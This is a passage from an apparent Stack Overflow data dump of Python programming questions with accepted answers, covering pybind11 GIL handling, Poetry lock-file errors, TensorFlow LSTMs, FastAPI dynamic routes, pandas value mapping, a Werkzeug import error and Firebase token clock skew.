    "Body": "The question\nIs pybind11 somehow magically doing the work of PyGILState_Ensure() and PyGILState_Release()? And if not, how should I do it?\nMore details\nThere are many questions regarding passing a python function to C++ as a callback using pybind11, but I haven't found one that explains the use of the GIL with pybind11.\nThe documentation is pretty clear about the GIL:\n\n[...] However, when threads are created from C (for example by a third-party library with its own thread management), they don\u2019t hold the GIL, nor is there a thread state structure for them.\nIf you need to call Python code from these threads (often this will be part of a callback API provided by the aforementioned third-party library), you must first register these threads with the interpreter by creating a thread state data structure, then acquiring the GIL, and finally storing their thread state pointer, before you can start using the Python/C API.\n\nI can easily bind a C++ function that takes a callback:\npy::class_ some_api(m, \"SomeApi\"); \nsome_api\n    .def(py::init())\n    .def(\"mode\", &SomeApi::subscribe_mode, \"Subscribe to 'mode' updates.\");\n\nWith the corresponding C++ function being something like:\nvoid subscribe_mode(const std::function& mode_callback);\n\nBut because pybind11 cannot know about the threading happening in my C++ implementation, I suppose it cannot handle the GIL for me. Therefore, if mode_callback is called by a thread created from C++, does that mean that I should write a wrapper to SomeApi::subscribe_mode that uses PyGILState_Ensure() and PyGILState_Release() for each call?\nThis answer seems to be doing something similar, but still slightly different: instead of \"taking the GIL\" when calling the callback, it seems like it \"releases the GIL\" when starting/stopping the thread. Still I'm wondering if there exists something like py::call_guard() that would do exactly what I (believe I) need, i.e. wrapping my callback with PyGILState_Ensure() and PyGILState_Release().\n",
    "AcceptedAnswerId": 72933328,
    "AcceptedAnswer": "In general\npybind11 tries to do the Right Thing and the GIL will be held when pybind11 knows that it is calling a python function, or in C++ code that is called from python via pybind11. The only time that you need to explicitly acquire the GIL when using pybind11 is when you are writing C++ code that accesses python and will be called from other C++ code, or if you have explicitly dropped the GIL.\nstd::function wrapper\nThe wrapper for std::function always acquires the GIL via gil_scoped_acquire when the function is called, so your python callback will always be called with the GIL held, regardless which thread it is called from.\nIf gil_scoped_acquire is called from a thread that does not currently have a GIL thread state associated with it, then it will create a new thread state. As a side effect, if nothing else in the thread acquires the thread state and increments the reference count, then once your function exits the GIL will be released by the destructor of gil_scoped_acquire and then it will delete the thread state associated with that thread.\nIf you're only calling the function once from another thread, this isn't a problem. If you're calling the callback often, it will create/delete the thread state a lot, which probably isn't great for performance. It would be better to cause the thread state to be created when your thread starts (or even easier, start the thread from Python and call your C++ code from python).\n"
}
{
    "Id": 71558637,
    "PostTypeId": 1,
    "Title": "Poetry fails with \"Retrieved digest for package not in poetry.lock metadata\"",
    "Body": "We're trying to merge and old branch in a project and when trying to build a docker image, poetry seems to fail for some reason that I don't understand.\nI'm not very familiar with poetry, as I've only used requirements.txt for dependencies up to now, so I'm fumbling a bit on what's going on.\nThe error that I'm getting (part of the playbook that builds the image on the server) is this:\n       \"Installing dependencies from lock file\",\n        \"\",\n        \"Package operations: 16 installs, 14 updates, 0 removals\",\n        \"\",\n        \"  \u2022 Updating importlib-metadata (4.8.3 -> 2.0.0)\",\n        \"  \u2022 Updating pyparsing (3.0.6 -> 2.4.7)\",\n        \"  \u2022 Updating six (1.16.0 -> 1.15.0)\",\n        \"\",\n        \"  RuntimeError\",\n        \"\",\n        \"  Retrieved digest for link six-1.15.0.tar.gz(sha256:30639c035cdb23534cd4aa2dd52c3bf48f06e5f4a941509c8bafd8ce11080259) not in poetry.lock metadata ['30639c035cdb23534cd4aa2dd52c3bf48f06e5f4a941509c8bafd8ce11080259', '8b74bedcbbbaca38ff6d7491d76f2b06b3592611af620f8426e82dddb04a5ced']\",\n        \"\",\n        \"  at /usr/local/lib/python3.7/dist-packages/poetry/installation/chooser.py:115 in _get_links\",\n        \"      111\u2502 \",\n        \"      112\u2502         if links and not selected_links:\",\n        \"      113\u2502             raise RuntimeError(\",\n        \"      114\u2502                 \\\"Retrieved digest for link {}({}) not in poetry.lock metadata {}\\\".format(\",\n        \"    \u2192 115\u2502                     link.filename, h, hashes\",\n        \"      116\u2502                 )\",\n        \"      117\u2502             )\",\n        \"      118\u2502 \",\n        \"      119\u2502         return selected_links\",\n        \"\",\n        \"\",\n        \"  RuntimeError\",\n        \"\",\n        \"  Retrieved digest for link pyparsing-2.4.7.tar.gz(sha256:c203ec8783bf771a155b207279b9bccb8dea02d8f0c9e5f8ead507bc3246ecc1) not in poetry.lock metadata ['c203ec8783bf771a155b207279b9bccb8dea02d8f0c9e5f8ead507bc3246ecc1', 'ef9d7589ef3c200abe66653d3f1ab1033c3c419ae9b9bdb1240a85b024efc88b']\",\n        \"\",\n        \"  at /usr/local/lib/python3.7/dist-packages/poetry/installation/chooser.py:115 in _get_links\",\n        \"      111\u2502 \",\n        \"      112\u2502         if links and not selected_links:\",\n        \"      113\u2502             raise RuntimeError(\",\n        \"      114\u2502                 \\\"Retrieved digest for link {}({}) not in poetry.lock metadata {}\\\".format(\",\n        \"    \u2192 115\u2502                     link.filename, h, hashes\",\n        \"      116\u2502                 )\",\n        \"      117\u2502             )\",\n        \"      118\u2502 \",\n        \"      119\u2502         return selected_links\",\n        \"\",\n        \"\",\n        \"  RuntimeError\",\n        \"\",\n        \"  Retrieved digest for link importlib_metadata-2.0.0.tar.gz(sha256:77a540690e24b0305878c37ffd421785a6f7e53c8b5720d211b211de8d0e95da) not in poetry.lock metadata ['77a540690e24b0305878c37ffd421785a6f7e53c8b5720d211b211de8d0e95da', 'cefa1a2f919b866c5beb7c9f7b0ebb4061f30a8a9bf16d609b000e2dfaceb9c3']\",\n        \"\",\n        \"  at /usr/local/lib/python3.7/dist-packages/poetry/installation/chooser.py:115 in _get_links\",\n        \"      111\u2502 \",\n        \"      112\u2502         if links and not selected_links:\",\n        \"      113\u2502             raise RuntimeError(\",\n        \"      114\u2502                 \\\"Retrieved digest for link {}({}) not in poetry.lock metadata {}\\\".format(\",\n        \"    \u2192 115\u2502                     link.filename, h, hashes\",\n        \"      116\u2502                 )\",\n        \"      117\u2502             )\",\n        \"      118\u2502 \",\n        \"      119\u2502         return selected_links\"\n    ]\n}\n\nIf you notice, for all 3 packages, the retrieved digest is actually in the list of digests of the metadata section of the poetry lock file.\nOur guess is that maybe this lock file was generated by an older version of poetry and is no longer valid. Maybe a hashing method should be mentioned (for example the retrieved digest is sha256, but no method is specified on the ones that are compared with it)?\nAnother curious thing is that poetry is not installed inside the dockerfile, but seems to reach that point, nevetheless, and I'm really curious how this can happen.\nAny insight would be greatly appreciated (and any link with more information, even)!\nThanks a lot for your time!  (Feel free to ask for more information if this seems inadequate to you!)\nCheers!\n",
    "AcceptedAnswerId": 72980882,
    "AcceptedAnswer": "When I've had this issue myself it has been fixed by recreating the lock file using a newer version of poetry. If you are able to view the .toml file I suggest deleting this lock file and then running poetry install to create a new lock file.\n"
}
{
    "Id": 72831076,
    "PostTypeId": 1,
    "Title": "How can I use a sequence of numbers to predict a single number in Tensorflow?",
    "Body": "I am trying to build a machine learning model which predicts a single number from a series of numbers. I am using a Sequential model from the keras API of Tensorflow.\nYou can imagine my dataset to look something like this:\n\n\n\n\nIndex\nx data\ny data\n\n\n\n\n0\nnp.ndarray(shape (1209278,) )\nnumpy.float32\n\n\n1\nnp.ndarray(shape (1211140,) )\nnumpy.float32\n\n\n2\nnp.ndarray(shape (1418411,) )\nnumpy.float32\n\n\n3\nnp.ndarray(shape (1077132,) )\nnumpy.float32\n\n\n...\n...\n...\n\n\n\n\nThis was my first attempt:\nI tried using a numpy ndarray which contains numpy ndarrays which finally contain floats as my xdata, so something like this:\narray([\n    array([3.59280851, 3.60459062, 3.60459062, ..., 4.02911493])\n    array([3.54752101, 3.56740332, 3.56740332, ..., 4.02837855])\n    array([3.61048168, 3.62152741, 3.62152741, ..., 4.02764217])\n])\n\nMy y data is a numpy ndarray containing floats, which looks something like this\narray([2.9864411, 3.0562437, ... , 2.7750807, 2.8712902], dtype=float32)\n\nBut when I tried to train the model using model.fit() it yields this error:\nValueError: Failed to convert a NumPy array to a Tensor (Unsupported object type numpy.ndarray).\n\nI was able to solve this error by asking a question related to this:\nHow can I have a series of numpy ndarrays as the input data to train a tensorflow machine learning model?\nMy latest attempt:\nBecause Tensorflow does not seem to be able to convert a ndarray of ndarrays to a tensor, I tried to convert my x data to a list of ndarrays like this:\n[\n    array([3.59280851, 3.60459062, 3.60459062, ..., 4.02911493])\n    array([3.54752101, 3.56740332, 3.56740332, ..., 4.02837855])\n    array([3.61048168, 3.62152741, 3.62152741, ..., 4.02764217])\n]\n\nI left my y data untouched, so as a ndarray of floats.\nSadly my attempt of using a list of ndarrays instead of a ndarray of ndarrays yielded this error:\nValueError: Data cardinality is ambiguous:\n  x sizes: 1304593, 1209278, 1407624, ...\n  y sizes: 46\nMake sure all arrays contain the same number of samples.\n\nAs you can see, my x data consists of arrays which all have a different shape.\nBut I don't think that this should be a problem.\nQuestion:\nMy guess is that Tensorflow tries to use my list of arrays as multiple inputs.\nTensorflow fit() documentation\nBut I don't want to use my x data as multiple inputs.\nEasily said I just want my model to predict a number from a sequence of numbers.\nFor example like this:\n\narray([3.59280851, 3.60459062, 3.60459062, ...]) => 2.8989773\narray([3.54752101, 3.56740332, 3.56740332, ...]) => 3.0893357\n...\n\nHow can I use a sequence of numbers to predict a single number in Tensorflow?\nEDIT\nMaybe I should have added that I want to use a RNN, especially a LSTM.\nI have had a look at the Keras documentation, and in their simplest example they are using a Embedding layer. But I don't really know what to do.\nAll in all I think that my question ist pretty general and should be easy to answer if you know how to tackle this problem, unlike me.\nThanks in advance!\n",
    "AcceptedAnswerId": 72869570,
    "AcceptedAnswer": "Try something like this:\nimport numpy as np\nimport tensorflow as tf\n\n# add additional dimension for lstm layer\nx_train = np.asarray(train_set[\"x data\"].values))[..., None] \ny_train = np.asarray(train_set[\"y data\"]).astype(np.float32)\n\nmodel = tf.keras.Sequential()\nmodel.add(tf.keras.layers.LSTM(units=32))\nmodel.add(tf.keras.layers.Dense(units=1))\nmodel.compile(loss=\"mean_squared_error\", optimizer=\"adam\", metrics=\"mse\")\nmodel.fit(x=x_train,y=y_train,epochs=10)\n\nOr with a ragged input for different sequence lengths:\nx_train = tf.ragged.constant(train_set[\"x data\"].values[..., None]) # add additional dimension for lstm layer\ny_train = np.asarray(train_set[\"y data\"]).astype(np.float32)\n\nmodel = tf.keras.Sequential()\nmodel.add(tf.keras.layers.Input(shape=[None, x_train.bounding_shape()[-1]], batch_size=2, dtype=tf.float32, ragged=True))\nmodel.add(tf.keras.layers.LSTM(units=32))\nmodel.add(tf.keras.layers.Dense(units=1))\nmodel.compile(loss=\"mean_squared_error\", optimizer=\"adam\", metrics=\"mse\")\nmodel.fit(x=x_train,y=y_train,epochs=10)\n\nOr:\nx_train = tf.ragged.constant([np.array(list(v))[..., None] for v in train_set[\"x data\"].values]) # add additional dimension for lstm layer\n\n"
}
{
    "Id": 73365780,
    "PostTypeId": 1,
    "Title": "Why is not recommended to install poetry with homebrew?",
    "Body": "Poetry official documentation strictly recommends sticking with the official installer. However, homebrew has poetry formulae.\nbrew install poetry\n\nUsually, I like to keep everything I can in homebrew to manage installations easily.\nWhat is the drawback and risks of installing poetry using homebrew instead of the recommended installation script?\n",
    "AcceptedAnswerId": 73365831,
    "AcceptedAnswer": "The drawback is that poetry will be unable to upgrade itself (I've no idea what'd actually happen), and you'll not be able to install specific poetry versions. Homebrew installed poetry will probably also depend on Homebrew-installed Python, etc, instead of having its own isolated venv to execute from.\nIf you use homebrew to install poetry, don't try to manage that installation any way outside of homebrew. Otherwise, it's probably fine.\n"
}
{
    "Id": 73049456,
    "PostTypeId": 1,
    "Title": "Apply the nested shape of one list on another flat list",
    "Body": "I have two lists:\nA: [[0, 1], [2, [3]], 4]\nB: [5, 6, 7, 8, 9]\nI wish list B could have the same shape with list A:\n[5, 6, 7, 8, 9] => [[5, 6], [7, [8]], 9]\nSo list A and list B have the same dimension/shape:\nA: [[0, 1], [2, [3]], 4]\nB: [[5, 6], [7, [8]], 9]\nConsider about time complexity, I hope there is a way of O(n) if possible.\n",
    "AcceptedAnswerId": 73049537,
    "AcceptedAnswer": "Assuming the number of items is identical, you could use a recursive function and an iterator:\nA = [[0, 1], [2, [3]], 4]\nB = [5, 6, 7, 8, 9]\n\ndef copy_shape(l, other):\n    if isinstance(other, list):\n        other = iter(other)\n    if isinstance(l, list):\n        return [copy_shape(x, other) for x in l]\n    else:\n        return next(other)\n    \nout = copy_shape(A, B)\n\noutput: [[5, 6], [7, [8]], 9]\nNB. the complexity is O(n). You can also use if hasattr(other, '__len__') or if not hasattr(other, '__next__') in place of if isinstance(other, list) to generalize to other iterables (except iterator).\n"
}
{
    "Id": 70783994,
    "PostTypeId": 1,
    "Title": "Reload routes in FastAPI during runtime",
    "Body": "I have a FastAPI app in which routes are dynamically generated based on an DB config.\nHowever, once the routes are defined and the app running, if the config changes, there seems to be no way to reload the config so that the routes could reflect the config.\nThe only solution I have for now is manually restart the asgi app by restarting uvicorn.\nIs there any way to fully regenerate routes without stopping the app, that could ideally be called from an URL ?\n",
    "AcceptedAnswerId": 74035526,
    "AcceptedAnswer": "It is possible to modify routes at runtime.\nFastAPI apps have the method add_api_route which allows you to dynamically define new endpoints. To remove an endpoint you will need to fiddle directly with the routes of the underlying Router.\nThe following code shows how to dynamically add and remove routes.\nimport fastapi\n\napp = fastapi.FastAPI()\n\n\n@app.get(\"/add\")\nasync def add(name: str):\n    async def dynamic_controller():\n        return f\"dynamic: {name}\"\n    app.add_api_route(f\"/dyn/{name}\", dynamic_controller, methods=[\"GET\"])\n    return \"ok\"\n\n\ndef route_matches(route, name):\n    return route.path_format == f\"/dyn/{name}\"\n\n\n@app.get(\"/remove\")\nasync def remove(name: str):\n    for i, r in enumerate(app.router.routes):\n        if route_matches(r, name):\n            del app.router.routes[i]\n            return \"ok\"\n    return \"not found\"\n\nAnd below is shown how to use it\n$ curl 127.0.0.1:8000/dyn/test\n{\"detail\":\"Not Found\"}\n$ curl 127.0.0.1:8000/add?name=test\n\"ok\"\n$ curl 127.0.0.1:8000/dyn/test\n\"dynamic: test\"\n$ curl 127.0.0.1:8000/add?name=test2\n\"ok\"\n$ curl 127.0.0.1:8000/dyn/test2\n\"dynamic: test2\"\n$ curl 127.0.0.1:8000/remove?name=test\n\"ok\"\n$ curl 127.0.0.1:8000/dyn/test\n{\"detail\":\"Not Found\"}\n$ curl 127.0.0.1:8000/dyn/test2\n\"dynamic: test2\"\n\nNote though, that if you change the routes dynamically you will need to invalidate the cache of the OpenAPI endpoint.\n"
}
{
    "Id": 74097901,
    "PostTypeId": 1,
    "Title": "meaning of `__all__` inside Python class",
    "Body": "I am aware of the use of __all__ at module scope. However I came across the usage of __all__ inside classes. This is done e.g. in the Python standardlib:\nclass re(metaclass=_DeprecatedType):\n    \"\"\"Wrapper namespace for re type aliases.\"\"\"\n\n    __all__ = ['Pattern', 'Match']\n    Pattern = Pattern\n    Match = Match\n\nWhat does __all__ achieve in this context?\n",
    "AcceptedAnswerId": 74098046,
    "AcceptedAnswer": "The typing module does some unorthodox things to patch existing modules (like re). Basically, the built-in module re is being replaced with this class re defined using a custom metaclass that intercepts attribute lookups on the underlying object. __all__ doesn't really have any special meaning to the class (it's just another class attribute), but it effectively becomes the __all__ attribute of the re module. It's the metaclass's definition of __getattribute__ that accomplishes this.\n"
}
{
    "Id": 73056540,
    "PostTypeId": 1,
    "Title": "No module named amazon_linux_extras when running amazon-linux-extras install epel -y",
    "Body": "Here is my (simplified) Dockerfile\n# https://docs.aws.amazon.com/lambda/latest/dg/images-create.html#images-create-from-base\nFROM public.ecr.aws/lambda/python:3.8\n\n# get the amazon linux extras\nRUN yum install -y amazon-linux-extras\n\nRUN amazon-linux-extras install epel -y\n\nWhen it reaches the RUN amazon-linux-extras install epel -y line during the build, it gets\nStep 6/8 : RUN amazon-linux-extras install epel -y\n ---> Running in dbb44f57111a\n/var/lang/bin/python: No module named amazon_linux_extras\nThe command '/bin/sh -c amazon-linux-extras install epel -y' returned a non-zero code: 1\n\nI think that has to do with some python 2 vs. 3 stuff, but I'm not sure\n",
    "AcceptedAnswerId": 73056713,
    "AcceptedAnswer": "You're correct, it's because amazon-linux-extras only works with Python 2. You can modify the RUN instruction to RUN PYTHON=python2 amazon-linux-extras install epel -y\n"
}
{
    "Id": 72893180,
    "PostTypeId": 1,
    "Title": "Flask-Restful Error: request Content-Type was not 'application/json'.\"}",
    "Body": "I was following this tutorial and it was going pretty well. He then introduced reqparse and I followed along. I tried to test my code and I get this error\n{'message': \"Did not attempt to load JSON data because the request Content-Type was not 'application/json'.\"}\nI don't know if I'm missing something super obvious but I'm pretty sure I copied his code exactly. here's the code:\nmain.py\nfrom flask import Flask, request\nfrom flask_restful import Api, Resource, reqparse\n\napp = Flask(__name__)\napi = Api(app)\n\n#basic get and post\nnames = {\"sai\": {\"age\": 19, \"gender\": \"male\"},\n            \"bill\": {\"age\": 23, \"gender\": \"male\"}}\nclass HelloWorld(Resource):\n    def get(self, name, numb):\n        return names[name]\n\n    def post(self):\n        return {\"data\": \"Posted\"}\n\napi.add_resource(HelloWorld, \"/helloworld//\")\n\n# getting larger data\npictures = {}\nclass picture(Resource):\n    def get(self, picture_id):\n        return pictures[picture_id]\n\n    def put(self, picture_id):\n        print(request.form['likes'])\n        pass\n\napi.add_resource(picture, \"/picture/\")\n\n# reqparse\nvideo_put_args = reqparse.RequestParser() # make new request parser object to make sure it fits the correct guidelines\nvideo_put_args.add_argument(\"name\", type=str, help=\"Name of the video\")\nvideo_put_args.add_argument(\"views\", type=int, help=\"Views on the video\")\nvideo_put_args.add_argument(\"likes\", type=int, help=\"Likes on the video\")\n\nvideos = {}\n\nclass Video(Resource):\n    def get(self, video_id):\n        return videos[video_id]\n\n    def post(self, video_id):\n        args = video_put_args.parse_args()\n        print(request.form['likes'])\n        return {video_id: args}\n\napi.add_resource(Video, \"/video/\")\n\nif __name__ == \"__main__\":\n    app.run(debug=True)\n\ntest_rest.py\nimport requests\n\nBASE = \"http://127.0.0.1:5000/\"\n\nresponse = requests.post(BASE + 'video/1', {\"likes\": 10})\n\nprint(response.json())\n\n",
    "AcceptedAnswerId": 72893595,
    "AcceptedAnswer": "I don't know why you have an issue as far as I can tell you did copy him exactly how he did it. Here's a fix that'll work although I can't explain why his code works and yours doesn't. His video is two years old so it could be deprecated behaviour.\nimport requests\nimport json\n\nBASE = \"http://127.0.0.1:5000/\"\n\npayload = {\"likes\": 10}\n\nheaders = {'accept': 'application/json'}\nresponse = requests.post(BASE + 'video/1', json=payload)\n\nprint(response.json())\n\n"
}
{
    "Id": 72956054,
    "PostTypeId": 1,
    "Title": "Zip like function that iterates over multiple items in lists and returns possibilities",
    "Body": "In the following code:\na = [[\"2022\"], [\"2023\"]]\nb = [[\"blue\", \"red\"], [\"green\", \"yellow\"]]\nc = [[\"1\", \"2\", \"3\"], [\"4\", \"5\", \"6\", \"7\"], [\"8\", \"9\", \"10\", \"11\"], [\"12\", \"13\"]]\n\nI would like a function that outputs this, but for any number of variables:\n[\n    [\"2022\", \"blue\", \"1\"],\n    [\"2022\", \"blue\", \"2\"],\n    [\"2022\", \"blue\", \"3\"],\n    [\"2022\", \"red\", \"4\"],\n    [\"2022\", \"red\", \"5\"],\n    [\"2022\", \"red\", \"6\"],\n    [\"2022\", \"red\", \"7\"],\n    [\"2023\", \"green\", \"8\"],\n    [\"2023\", \"green\", \"9\"],\n    [\"2023\", \"green\", \"10\"],\n    [\"2023\", \"green\", \"11\"],\n    [\"2023\", \"yellow\", \"12\"],\n    [\"2023\", \"yellow\", \"13\"],\n]\n\nI have searched for a function to do this with itertools or zip, but haven't found anything yet.\nTo clarify, my use case for this was to iterate through values of a nested/multi-level dropdown menu (the first dropdown returns options, and each option returns a different dropdown, and so on).\n",
    "AcceptedAnswerId": 72956257,
    "AcceptedAnswer": "First, you join the first argument, to a list of lists with only one element each.\nThen for each sublist and its index i in the next argument, you pick the i-th list of the previous iteration res[i] and add to aux len(sublist) lists each of one is the res[i] with one item from sublist.\nfrom itertools import chain\n\ndef f(*args):\n    res = list(chain.from_iterable([[item] for item in l] for l in args[0]))\n    for arg in args[1:]:\n        aux = []\n        for i, sublist in enumerate(arg):\n            aux += [res[i] + [opt] for opt in sublist]\n        res = aux\n    return res\n\nIn addition if you want to verify that the arguments passed to the function are correct, you can use this:\ndef check(*args):\n    size = sum(len(l) for l in args[0])\n    for arg in args[1:]:\n        if len(arg) != size:\n            return False\n        size = sum(len(l) for l in arg)\n    return True\n\n"
}
{
    "Id": 73436440,
    "PostTypeId": 1,
    "Title": "Replace and merge rows in pandas according to condition",
    "Body": "I have a dataframe:\n   lft rel rgt num\n0   t3  r3  z2  3\n1   t1  r3  x1  9\n2   x2  r3  t2  8\n3   x4  r1  t2  4\n4   t1  r1  z3  1\n5   x1  r1  t2  2\n6   x2  r2  t4  4\n7   z3  r2  t4  5\n8   t4  r3  x3  4\n9   z1  r2  t3  4\n\nAnd a reference dictionary:\nreplacement_dict = {\n    'X1' : ['x1', 'x2', 'x3', 'x4'],\n    'Y1' : ['y1', 'y2'],\n    'Z1' : ['z1', 'z2', 'z3']\n}\n\nMy goal is to replace all occurrences of replacement_dict['X1'] with 'X1', and then merge the rows together. For example, any instance of 'x1', 'x2', 'x3' or 'x4' will be replaced by 'X1', etc.\nI can do this by selecting the rows that contain any of these strings and replacing them with 'X1':\nkeys = replacement_dict.keys()\nfor key in keys:\n    DF.loc[DF['lft'].isin(replacement_dict[key]), 'lft'] = key\n    DF.loc[DF['rgt'].isin(replacement_dict[key]), 'rgt'] = key\n\ngiving:\n    lft rel rgt num\n0   t3  r3  Z1  3\n1   t1  r3  X1  9\n2   X1  r3  t2  8\n3   X1  r1  t2  4\n4   t1  r1  Z1  1\n5   X1  r1  t2  2\n6   X1  r2  t4  4\n7   Z1  r2  t4  5\n8   t4  r3  X1  4\n9   Z1  r2  t3  4\n\nNow, if I select all the rows containing 'X1' and merge them, I should end up with:\n    lft rel rgt num\n0   X1  r3  t2  8\n1   X1  r1  t2  6\n2   X1  r2  t4  4\n3   t1  r3  X1  9\n4   t4  r3  X1  4\n\nSo the three columns ['lft', 'rel', 'rgt'] are unique while the 'num' column is added up for each of these rows. The row 1 above : ['X1'  'r1'  't2'  6] is the sum of two rows ['X1'  'r1'  't2'  4] and ['X1'  'r1'  't2'  2].\nI can do this easily for a small number of rows, but I am working with a dataframe with 6 million rows and a replacement dictionary with 60,000 keys. This is taking forever using a simple row wise extraction and replacement.\nHow can this (specifically the last part) be scaled efficiently? Is there a pandas trick that someone can recommend?\n",
    "AcceptedAnswerId": 73436639,
    "AcceptedAnswer": "Reverse the replacement_dict mapping and map() this new mapping to each of lft and rgt columns to substitute certain values (e.g. x1->X1, y2->Y1 etc.). As some values in lft and rgt columns don't exist in the mapping (e.g. t1, t2 etc.), call fillna() to fill in these values.1\nYou may also stack() the columns whose values need to be replaced (lft and rgt), call map+fillna and unstack() back but because there are only 2 columns, it may not be worth the trouble for this particular case.\nThe second part of the question may be answered by summing num values after grouping by lft, rel and rgt columns; so groupby().sum() should do the trick.\n# reverse replacement map\nreverse_map = {v : k for k, li in replacement_dict.items() for v in li}\n\n# substitute values in lft column using reverse_map\ndf['lft'] = df['lft'].map(reverse_map).fillna(df['lft'])\n# substitute values in rgt column using reverse_map\ndf['rgt'] = df['rgt'].map(reverse_map).fillna(df['rgt'])\n\n# sum values in num column by groups\nresult = df.groupby(['lft', 'rel', 'rgt'], as_index=False)['num'].sum()\n\n1: map() + fillna() may perform better for your use case than replace() because under the hood, map() implements a Cython optimized take_nd() method that performs particularly well if there are a lot of values to replace, while replace() implements replace_list() method which uses a Python loop. So if replacement_dict is particularly large (which it is in your case), the difference in performance will be huge, but if replacement_dict is small, replace() may outperform map().\n"
}
{
    "Id": 74202814,
    "PostTypeId": 1,
    "Title": "In python, create index from flat representation of nested structure in a list, sorting by alphabetical order",
    "Body": "I have lists where each entry is representing a nested structure, where / represents each level in the structure.\n['a','a/b/a','a/b','a/b/d',....]\n\nI want to take such a list and return an index list where each level is sorted in alphabetical order.\nIf we had the following list\n['a','a/b','a/b/a','a/c','a/c/a','b']\n\nIt represents the nested structure\n'a':                   #1\n\n    'b':               #1.1\n         'a': ...      #1.1.1\n    'c':               #1.2\n         'a': ...      #1.2.1\n'b' : ...              #2\n\nI am trying to get the output\n ['1','1.1','1.1.1', '1.2','1.2.1','2']\n\nBut I am having real issue on how to tackle the problem, would it be solved recursively? Or what would be a way to solve this for any generic list where each level is separated by /? The list is originally not necessarily sorted, and each level can be any generic word.\n",
    "AcceptedAnswerId": 74204355,
    "AcceptedAnswer": "Since the goal is to simply convert the paths to indices according to their respective positions against other paths of the same prefix, there is no need to build a tree at all. Instead, iterate over the paths in alphabetical order while using a dict of sets to keep track of the prefixes at each level of paths, and join the lengths of sets at each level for output:\ndef indices(paths):\n    output = {}\n    names = {}\n    for index, path in sorted(enumerate(paths), key=lambda t: t[1]):\n        counts = []\n        prefixes = tuple(path.split('/'))\n        for level, name in enumerate(prefixes):\n            prefix = prefixes[:level]\n            names.setdefault(prefix, set()).add(name)\n            counts.append(len(names[prefix]))\n        output[index] = '.'.join(map(str, counts))\n    return list(map(output.get, range(len(output))))\n\nso that:\nprint(indices(['a', 'a/b', 'a/b/a', 'a/c', 'a/c/a', 'b']))\nprint(indices(['a', 'c', 'b', 'a/b']))\nprint(indices(['a/b/c/d', 'a/b/d', 'a/b/c']))\nprint(indices(['abc/d', 'bcc/d']))\nprint(indices(['apple/cat','apple/dog', 'banana/dog']))\n\noutputs:\n['1', '1.1', '1.1.1', '1.2', '1.2.1', '2']\n['1', '3', '2', '1.1']\n['1.1.1.1', '1.1.2', '1.1.1']\n['1.1', '2.1']\n['1.1', '1.2', '2.1']\n\nDemo: https://replit.com/@blhsing/StainedMassivePi\n"
}
{
    "Id": 73105877,
    "PostTypeId": 1,
    "Title": "ImportError: cannot import name 'parse_rule' from 'werkzeug.routing'",
    "Body": "I got the following message after running my Flask project on another system.\nThe application ran all the time without problems:\nError: While importing 'app', an ImportError was raised:\n\nTraceback (most recent call last):\n  File \"c:\\users\\User\\appdata\\local\\programs\\python\\python39\\lib\\site-packages\\flask\\cli.py\", line 214, in locate_app\n    __import__(module_name)\n  File \"C:\\Users\\User\\Desktop\\Projekt\\app\\__init__.py\", line 3, in \n    from flask_restx import Namespace, Api\n  File \"c:\\users\\User\\appdata\\local\\programs\\python\\python39\\lib\\site-packages\\flask_restx\\__init__.py\", line 5, in \n  File \"c:\\users\\User\\appdata\\local\\programs\\python\\python39\\lib\\site-packages\\flask_restx\\api.py\", line 50, in \n    from .swagger import Swagger\n  File \"c:\\users\\User\\appdata\\local\\programs\\python\\python39\\lib\\site-packages\\flask_restx\\swagger.py\", line 18, in \n    from werkzeug.routing import parse_rule\nImportError: cannot import name 'parse_rule' from 'werkzeug.routing' (c:\\users\\User\\appdata\\local\\programs\\python\\python39\\lib\\site-packages\\werkzeug\\routing\\__i\nnit__.py)\n\nMy requirements.txt\nFlask~=2.1.2\npsycopg2-binary==2.9.3\nFlask-SQLAlchemy==2.5.1\nflask-restx==0.5.1\nqrcode~=7.3.1\nPyPDF2==2.6.0\nreportlab~=3.6.10\nWTForms~=3.0.1\nflask-bootstrap==3.3.7.1\nflask-wtf==1.0.1\n\n",
    "AcceptedAnswerId": 73105878,
    "AcceptedAnswer": "The workaround I use for now is to pin werkzeug to 2.1.2 in requirements.txt. This should only be done until the other libraries are compatible with the latest version of Werkzeug, at which point the pin should be updated.\nwerkzeug==2.1.2\n\n"
}
{
    "Id": 71915309,
    "PostTypeId": 1,
    "Title": "Token used too early error thrown by firebase_admin auth's verify_id_token method",
    "Body": "Whenever I run\nfrom firebase_admin import auth\nauth.verify_id_token(firebase_auth_token)\n\nIt throws the following error:\nToken used too early, 1650302066 < 1650302067. Check that your computer's clock is set correctly.\n\nI'm aware that the underlying google auth APIs do check the time of the token, however as outlined  here there should be a 10 second clock skew. Apparently, my server time is off by 1 second, however running this still fails even though this is well below the allowed 10 second skew. Is there a way to fix this?\n",
    "AcceptedAnswerId": 72977610,
    "AcceptedAnswer": "This is how the firebase_admin.verify_id_token verifies the token:\nverified_claims = google.oauth2.id_token.verify_token(\n                    token,\n                    request=request,\n                    audience=self.project_id,\n                    certs_url=self.cert_url)\n\nand this is the definition of google.oauth2.id_token.verify_token(...)\ndef verify_token(\n    id_token,\n    request,\n    audience=None,\n    certs_url=_GOOGLE_OAUTH2_CERTS_URL,\n    clock_skew_in_seconds=0,\n):\n\nAs you can see, the function verify_token allows to specify a \"clock_skew_in_seconds\" but the firebase_admin function is not passing it along, thus the the default of 0 is used and since your server clock is off by 1 second, the check in verify_token fails.\nI would consider this a bug in firebase_admin.verify_id_token and maybe you can open an issue against the firebase admin SDK, but other than that you can only make sure, your clock is either exact or shows a time EARLIER than the actual time\nEdit:\nI actually opened an issue on GitHub for firebase/firebase-admin-Python and created an according pull request since I looked at all the source files already anyway...\nIf and when the pull request is merged, the server's clock is allowed to be off by up to a minute.\n"
}
{
    "Id": 73134521,
    "PostTypeId": 1,
    "Title": "How to train on a tensorflow_datasets dataset",
